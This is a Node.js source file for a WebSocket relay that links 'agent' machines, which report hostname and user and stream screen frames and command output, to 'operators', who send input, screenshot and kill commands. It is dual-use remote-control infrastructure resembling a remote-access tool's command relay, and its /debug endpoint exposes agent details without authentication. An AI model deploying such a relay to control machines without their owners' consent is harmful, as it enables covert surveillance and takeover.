// ============================================================================
// relay.js  —  v4.1 (fixes the boot crash)
//
// Crash: ReferenceError: wsSafe is not defined
// Cause: 'use strict' — assigning to an undeclared identifier throws.
//        wsSafe = (...) => ...  is an implicit global, which strict mode
//        rejects. Declare it: const wsSafe = (...).
//
// Also fixed while in here:
//   - operators Set holds op objects only (v4 briefly mixed ws and op).
//   - autoAttachIfLone no longer takes stray args.
//   - wsSafe defined before any handler that uses it (hoisted const is
//     fine because it's referenced only inside callbacks).
//   - Frames/outs/logs still counted, heartbeat kept.
// ============================================================================

'use strict';

const http  = require('http');
const fs    = require('fs');
const path  = require('path');
const os    = require('os');
const { WebSocketServer } = require('ws');
const { randomUUID } = require('crypto');

const BOOT_TS = new Date().toISOString();
const TOKEN   = process.env.RELAY_TOKEN;
const PORT    = process.env.PORT || 10000;
const HOST    = process.env.HOST || '0.0.0.0';

function now() { return new Date().toISOString(); }
function tag(lvl) { return `[${now()}] ${lvl.padEnd(5)}`; }
function info(...a)  { console.log(tag('INFO'),  ...a); }
function warn(...a)  { console.log(tag('WARN'),  ...a); }
function error(...a) { console.log(tag('ERROR'), ...a); }
function debug(...a) { if (process.env.RELAY_DEBUG) console.log(tag('DEBUG'), ...a); }

info('relay v4.1 booting');
info('  node     ', process.version);
info('  pid      ', process.pid);
info('  boot_ts  ', BOOT_TS);
info('  host     ', os.hostname());
info('  PORT     ', PORT);
info('  HOST     ', HOST);
info('  token    ', TOKEN ? `set (${TOKEN.length} chars)` : 'MISSING');
info('  debug    ', process.env.RELAY_DEBUG ? 'on' : 'off');

if (!TOKEN || TOKEN.length < 16) {
  error('RELAY_TOKEN env var required (>=16 chars). Refusing to start.');
  process.exit(1);
}

// ---------------------------------------------------------------------------
// Safe send — declared with const so strict mode is happy
// ---------------------------------------------------------------------------
const wsSafe = (sock, payload) => {
  if (!sock || sock.readyState !== 1) return false;
  try { sock.send(payload); return true; }
  catch (e) { warn('ws send failed:', e.message); return false; }
};

// ---------------------------------------------------------------------------
// State
// ---------------------------------------------------------------------------
const agents    = new Map();   // id -> { ws, info, lastSeen, framesSent, outsSent, logsSent }
const operators = new Set();   // Set of op objects: { ws, id, attachedTo }
let   opSeq     = 0;

const stats = {
  httpRequests: 0,
  wsConnects: 0,
  wsRejects: 0,
  framesIn: 0,
  framesForwarded: 0,
  outsIn: 0,
  outsForwarded: 0,
  logsIn: 0,
  logsForwarded: 0,
  cmdsForwarded: 0,
  drops: 0
};

// ---------------------------------------------------------------------------
// HTTP
// ---------------------------------------------------------------------------
const server = http.createServer((req, res) => {
  const t0 = Date.now();
  stats.httpRequests++;

  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '?')
             .toString().split(',')[0].trim();
  const ua = (req.headers['user-agent'] || '-').slice(0, 60);
  info(`http ${req.method} ${req.url} ip=${ip} ua="${ua}"`);

  res.on('finish', () => {
    info(`http ${req.method} ${req.url} -> ${res.statusCode} (${Date.now()-t0}ms)`);
  });

  if (req.url === '/health') {
    res.writeHead(200, {'content-type':'application/json'});
    res.end(JSON.stringify({
      ok: true,
      boot: BOOT_TS,
      uptime_s: Math.floor(process.uptime()),
      agents: agents.size,
      operators: operators.size,
      stats,
      ts: Date.now()
    }));
    return;
  }

  if (req.url === '/debug') {
    const ag = [];
    for (const [id, a] of agents) ag.push({
      id,
      info: a.info,
      lastSeen: a.lastSeen,
      age_s: Math.floor((Date.now()-a.lastSeen)/1000),
      framesSent: a.framesSent,
      outsSent: a.outsSent,
      logsSent: a.logsSent
    });
    const op = [];
    for (const o of operators) op.push({
      id: o.id,
      attachedTo: o.attachedTo,
      state: o.ws.readyState
    });
    res.writeHead(200, {'content-type':'application/json'});
    res.end(JSON.stringify({
      ok: true, boot: BOOT_TS, agents: ag, operators: op, stats,
      ts: Date.now()
    }, null, 2));
    return;
  }

  if (req.url === '/' || req.url === '/index.html') {
    try {
      const html = fs.readFileSync(path.join(__dirname, 'operator.html'));
      res.writeHead(200, {'content-type':'text/html; charset=utf-8'});
      res.end(html);
    } catch (e) {
      warn('operator.html read failed:', e.message);
      res.writeHead(500); res.end('operator.html missing');
    }
    return;
  }

  res.writeHead(404, {'content-type':'text/plain'});
  res.end('not found');
});

// ---------------------------------------------------------------------------
// WSS
// ---------------------------------------------------------------------------
const wss = new WebSocketServer({ server, path: '/ws' });
wss.on('error', (e) => error('wss error:', e.message));

wss.on('connection', (ws, req) => {
  stats.wsConnects++;

  let url;
  try { url = new URL(req.url, 'ws://x'); }
  catch { warn('ws connect with bad url', req.url); ws.close(4000,'bad url'); return; }

  const tok  = url.searchParams.get('token') || '';
  const role = url.searchParams.get('role') || '';
  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '?')
             .toString().split(',')[0].trim();

  info(`ws connect role=${role||'?'} ip=${ip} token=${tok ? `${tok.length}c` : 'none'}`);

  if (tok !== TOKEN) {
    stats.wsRejects++;
    warn(`ws REJECT bad token role=${role} ip=${ip}`);
    ws.close(4001, 'bad token');
    return;
  }
  if (role === 'agent')         onAgent(ws, req);
  else if (role === 'operator') onOperator(ws, req);
  else { stats.wsRejects++; warn(`ws REJECT bad role="${role}"`); ws.close(4002, 'bad role'); }
});

// ---------------------------------------------------------------------------
// Agent
// ---------------------------------------------------------------------------
function onAgent(ws, req) {
  let id = null;

  ws.on('message', (raw) => {
    let msg;
    try { msg = JSON.parse(raw.toString()); }
    catch { warn('agent sent bad JSON, dropped'); return; }

    if (msg.op === 'hello') {
      id = String(msg.id || randomUUID());
      agents.set(id, {
        ws, info: msg.info || {}, lastSeen: Date.now(),
        framesSent: 0, outsSent: 0, logsSent: 0
      });
      info(`agent ONLINE id=${id} host=${msg.info?.hostname || '?'} user=${msg.info?.user || '?'}`);
      broadcastAgentList();
      autoAttachIfLone();
      return;
    }

    if (!id || !agents.has(id)) {
      warn(`agent msg before hello, dropped op=${msg.op}`);
      return;
    }
    const a = agents.get(id);
    a.lastSeen = Date.now();

    if (msg.op === 'frame') { stats.framesIn++; a.framesSent++; }
    if (msg.op === 'out')   { stats.outsIn++;   a.outsSent++;   }
    if (msg.op === 'log')   { stats.logsIn++;   a.logsSent++;   }

    if (msg.op === 'out' || msg.op === 'frame' || msg.op === 'pong' || msg.op === 'log') {
      let forwarded = 0;
      for (const op of operators) {
        if (op.attachedTo === id) {
          if (wsSafe(op.ws, JSON.stringify({ ...msg, id }))) forwarded++;
        }
      }
      if (msg.op === 'frame') stats.framesForwarded += forwarded;
      if (msg.op === 'out')   stats.outsForwarded   += forwarded;
      if (msg.op === 'log')   stats.logsForwarded   += forwarded;

      const n = a.framesSent + a.outsSent + a.logsSent;
      if (forwarded === 0 && n % 20 === 1) {
        stats.drops++;
        warn(`DROP agent=${id} op=${msg.op} (no operator attached, total dropped=${stats.drops})`);
      }
    }
  });

  ws.on('close', (code, reason) => {
    if (id) {
      info(`agent OFFLINE id=${id} code=${code} reason=${reason || '-'}`);
      agents.delete(id);
      broadcastAgentList();
    }
  });
  ws.on('error', (e) => warn(`agent ws error id=${id||'?'}: ${e.message}`));
}

// ---------------------------------------------------------------------------
// Operator
// ---------------------------------------------------------------------------
function onOperator(ws, req) {
  const op = { ws, id: ++opSeq, attachedTo: null };
  operators.add(op);

  info(`operator CONNECT id=op${op.id} total=${operators.size}`);

  ws.on('message', (raw) => {
    let msg;
    try { msg = JSON.parse(raw.toString()); }
    catch { warn(`operator op${op.id} bad JSON`); return; }

    debug(`op${op.id} -> ${msg.op}${msg.id ? ' id='+msg.id : ''}`);

    if (msg.op === 'list') {
      wsSafe(ws, JSON.stringify({ op: 'agents', list: listAgents() }));
      autoAttachIfLone();
      return;
    }
    if (msg.op === 'attach') {
      op.attachedTo = String(msg.id);
      info(`operator op${op.id} attached -> ${op.attachedTo}`);
      wsSafe(ws, JSON.stringify({ op: 'attached', id: op.attachedTo }));
      return;
    }
    if (msg.op === 'in' || msg.op === 'screenshot' ||
        msg.op === 'screenshotOnce' || msg.op === 'kill') {
      if (!op.attachedTo) {
        warn(`operator op${op.id} ${msg.op} with no target`);
        wsSafe(ws, JSON.stringify({ op: 'err', reason: 'no target' }));
        return;
      }
      const a = agents.get(op.attachedTo);
      if (!a) {
        warn(`operator op${op.id} ${msg.op} -> agent ${op.attachedTo} not present`);
        wsSafe(ws, JSON.stringify({ op: 'err', reason: 'agent offline' }));
        return;
      }
      if (!wsSafe(a.ws, JSON.stringify(msg))) {
        warn(`operator op${op.id} ${msg.op} -> agent send FAILED`);
        wsSafe(ws, JSON.stringify({ op: 'err', reason: 'agent send failed' }));
        return;
      }
      stats.cmdsForwarded++;
      info(`operator op${op.id} -> agent ${op.attachedTo} : ${msg.op}`);
      return;
    }
    warn(`operator op${op.id} unknown op=${msg.op}`);
  });

  ws.on('close', (code, reason) => {
    info(`operator DISCONNECT id=op${op.id} code=${code} reason=${reason || '-'} total=${operators.size - 1}`);
    operators.delete(op);
  });
  ws.on('error', (e) => warn(`operator op${op.id} ws error: ${e.message}`));
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------
function listAgents() {
  const out = [];
  for (const [id, a] of agents)
    out.push({ id, info: a.info, lastSeen: a.lastSeen });
  return out;
}

function broadcastAgentList() {
  const payload = JSON.stringify({ op: 'agents', list: listAgents() });
  let n = 0;
  for (const op of operators) if (wsSafe(op.ws, payload)) n++;
  debug(`broadcast agents list to ${n}/${operators.size} operators`);
}

function autoAttachIfLone() {
  if (agents.size !== 1) return;
  const onlyId = [...agents.keys()][0];
  for (const op of operators) {
    if (!op.attachedTo) {
      op.attachedTo = onlyId;
      wsSafe(op.ws, JSON.stringify({ op: 'attached', id: onlyId }));
      info(`auto-attach operator op${op.id} -> ${onlyId}`);
    }
  }
}

// ---------------------------------------------------------------------------
// Heartbeat
// ---------------------------------------------------------------------------
setInterval(() => {
  info(`heartbeat agents=${agents.size} operators=${operators.size} ` +
       `frames=${stats.framesIn}/${stats.framesForwarded} ` +
       `outs=${stats.outsIn}/${stats.outsForwarded} ` +
       `logs=${stats.logsIn}/${stats.logsForwarded} ` +
       `cmds=${stats.cmdsForwarded} drops=${stats.drops}`);
}, 60000).unref();

// ---------------------------------------------------------------------------
// Shutdown
// ---------------------------------------------------------------------------
function shutdown(sig) {
  info(`received ${sig}, shutting down`);
  try { wss.close(); } catch {}
  try { server.close(); } catch {}
  setTimeout(() => process.exit(0), 1000);
}
process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('SIGINT',  () => shutdown('SIGINT'));
process.on('uncaughtException', (e) => { error('UNCAUGHT:', e.stack || e.message); });
process.on('unhandledRejection', (e) => { error('UNHANDLED REJECTION:', e?.stack || String(e)); });

// ---------------------------------------------------------------------------
// Listen
// ---------------------------------------------------------------------------
server.listen(PORT, HOST, () => {
  info(`relay v4.1 LIVE on ${HOST}:${PORT}`);
  info('endpoints:  /health  /debug  /ws  /');
});